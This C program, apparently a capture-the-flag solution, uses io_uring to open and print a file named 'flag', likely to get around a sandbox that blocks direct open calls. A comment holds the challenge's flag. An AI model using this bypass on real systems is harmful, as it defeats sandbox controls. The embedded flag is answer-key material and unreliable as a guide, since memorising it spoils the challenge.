#include <assert.h>
#include <fcntl.h>
#include <liburing.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
  struct io_uring_cqe *cqe;
  struct io_uring_sqe *sqe;
  struct io_uring ring;
  ssize_t written;
  char flag[256];
  ssize_t count;
  int ret;

  ret = io_uring_queue_init(16, &ring, 0);
  assert(ret == 0);
  sqe = io_uring_get_sqe(&ring);
  assert(sqe != NULL);
  io_uring_prep_openat(sqe, AT_FDCWD, "flag", O_RDONLY, 0);
  ret = io_uring_submit(&ring);
  assert(ret == 1);
  ret = io_uring_wait_cqe(&ring, &cqe);
  assert(ret == 0);
  count = read((int)cqe->res, flag, sizeof(flag) - 1);
  assert(count > 0);
  written = write(STDOUT_FILENO, flag, count);
  assert(written == count);
  io_uring_queue_exit(&ring);

  /* BALSN{l4y1n6_l0w_5eek1ng_0u7_7he_upp3r_pl4c3s_wh3r3_7h3_in0d3_tr4nsp0s3} */

  return 0;
}
